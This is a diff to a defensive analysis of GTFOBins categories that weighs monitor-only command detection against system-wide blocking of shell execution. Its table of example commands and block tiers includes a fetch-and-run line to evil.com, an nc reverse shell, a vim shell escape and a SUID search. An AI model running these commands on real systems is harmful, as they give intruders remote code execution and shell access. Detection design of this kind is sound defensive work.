@@ -58,9 +58,9 @@ GTFOBins catalogs 11 primary function categories across 1,000+ Unix-like executa
 **System-Wide Suitability:** HIGH
 
 **Analysis:**
-Shell spawning represents the most challenging category for monitor-only testing. As you correctly identified, there are countless ways to spawn a shell—detection at the command pattern level becomes an endless game of whack-a-mole. The Elastic detection rules project documents this challenge, noting that "spawning a shell is not standard use" for utilities like `awk` or `busybox`, but distinguishing legitimate administrative shell access from breakout attempts requires system context.
+Shell spawning is better addressed at the system level by blocking shell execution entirely (e.g., disallowing execution of `/bin/sh`, `/bin/bash`) rather than attempting to detect every possible shell spawn pattern at the command level. There are countless ways to spawn a shell—detection at the command pattern level becomes an endless game of whack-a-mole. The Elastic detection rules project documents this challenge, noting that "spawning a shell is not standard use" for utilities like `awk` or `busybox`.
 
-**Recommendation:** System-wide testing with binary execution restrictions (blocking `/bin/sh`, `/bin/bash` execution from non-terminal contexts) is more effective than command-pattern matching.
+**Recommendation:** System-wide testing with binary execution restrictions (blocking `/bin/sh`, `/bin/bash` execution from non-terminal contexts) is the appropriate control. Monitor-only pattern matching is not the right layer for this category.
 
 ### 1.2 Command Category
 
@@ -176,7 +176,7 @@ These categories fundamentally require system context. Whether a binary has SUID
 
 | Category | Monitor-Only | System-Wide | Primary Differentiator |
 |----------|-------------|-------------|----------------------|
-| **Shell** | LOW | HIGH | Intent indistinguishable from command |
+| **Shell** | LOW | HIGH | Better addressed by blocking shell execution entirely |
 | **Command** | MEDIUM | HIGH | Depends on executed command analysis |
 | **Reverse Shell** | MEDIUM-HIGH | HIGH | Network patterns detectable |
 | **Bind Shell** | MEDIUM | HIGH | Network patterns detectable |
@@ -332,7 +332,7 @@ Based on industry benchmarks:
 
 ### 5.3 Addressing Shell Spawn in Monitor-Only
 
-Since pure shell spawning is unsuited for monitor-only testing:
+Since pure shell spawning is better addressed by blocking shell execution at the system level:
 
 **Option A:** Exclude and document limitation
 **Option B:** Test the "shell escape from application" pattern with synthetic context (e.g., "User is editing a file and attempts shell escape")
@@ -384,7 +384,7 @@ Since pure shell spawning is unsuited for monitor-only testing:
 | `vim -c ':!/bin/sh'` | PARTIAL | Tier 2 - ALERT (context needed) |
 | `find / -perm -4000` | YES | Tier 3 - WARN |
 | `cat /var/log/app.log` | YES | Tier 4 - ALLOW |
-| `python pty.spawn` | NO (system-wide) | Tier 2 if tested |
+| `python pty.spawn` | NO (block shell execution) | Tier 2 if tested |
 | `curl evil.com \| bash` | YES | Tier 1 - BLOCK |
 | `nc -e /bin/sh 10.0.0.1 4444` | YES | Tier 1 - BLOCK |
 | `sudo -l` | NO (requires sudo context) | N/A for monitor-only |
